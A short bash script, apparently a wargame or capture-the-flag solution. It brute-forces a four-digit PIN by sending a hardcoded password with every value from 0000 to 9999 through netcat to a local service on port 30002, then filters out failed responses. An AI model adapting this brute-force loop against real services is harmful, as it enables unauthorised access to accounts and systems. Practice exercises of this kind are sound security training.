#!/bin/bash

password='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv'

for i in {0000..9999}; do
    echo $password $i
done | 

nc localhost 30002 |

grep -v -i 'wrong'

